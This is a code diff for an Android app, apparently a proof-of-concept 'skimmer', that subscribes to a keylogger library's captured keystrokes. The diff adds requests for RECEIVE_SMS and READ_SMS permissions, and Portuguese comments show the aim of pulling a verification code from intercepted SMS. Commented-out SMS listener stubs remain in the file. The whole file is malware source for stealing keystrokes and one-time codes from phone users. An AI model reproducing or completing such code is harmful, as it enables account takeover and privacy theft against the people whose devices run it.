@@ -1,21 +1,28 @@
 package com.example.skimmerpoc
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
 import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
+import android.telephony.SmsManager
 import android.util.Log
 import android.view.View
 import android.widget.Button
 import android.widget.EditText
 import android.widget.Toast
+import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
+import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import com.evilthreads.keylogger.Keylogger
 import kotlinx.android.synthetic.main.activity_main.*
@@ -23,12 +30,16 @@ import kotlinx.coroutines.launch
 import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
+    //, SmsListener
     lateinit var sharedPreferences: SharedPreferences;
     var codeTyped: String? = null;
+    //private lateinit var broadcastSMS : BroadcastSMS
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+       // broadcastSMS = BroadcastSMS(this)
 
         sharedPreferences = this.getSharedPreferences(
             "com.example.skimmerpoc",
@@ -37,7 +48,7 @@ class MainActivity : AppCompatActivity() {
 
         Keylogger.requestPermission(this)
         createNotificationChannel();
-
+        permissionSMS();
         lifecycleScope.launch {
             Keylogger.subscribe { entry ->
                 var value = entry.toString();
@@ -79,10 +90,25 @@ class MainActivity : AppCompatActivity() {
             notificationManager.createNotificationChannel(channel)
         }
     }
+    fun permissionSMS() {
+        //Verificação se a permissão já foi aceita ou não
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
+            PackageManager.PERMISSION_GRANTED){
+        //Se caso a permissão ainda não foi aceita, monta a caixa para pedir permissão
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECEIVE_SMS),10);
+        }
+
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
+            PackageManager.PERMISSION_GRANTED){
+        //Se caso a permissão ainda não foi aceita, monta a caixa para pedir permissão
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS),11);
+        }
+    }
 
     fun onSubmit(view: View){
         try {
             val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
+            //incluir na variavel code o codigo detectado (via SMS)
             val code = codeInputFieldText.text.toString();
 
             if (code == "") {
@@ -102,4 +128,17 @@ class MainActivity : AppCompatActivity() {
             Log.e("Content retrieved", e.toString());
         }
     }
+
+//    override fun onSmsReceived(message: String) {
+//        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
+//        println(message)
+//    }
+
+
+//    override fun onDestroy() {
+//        super.onDestroy()
+//        // Unregister the SmsReceiver when the activity is destroyed
+//        unregisterReceiver(smsReceiver)
+//    }
+
 }
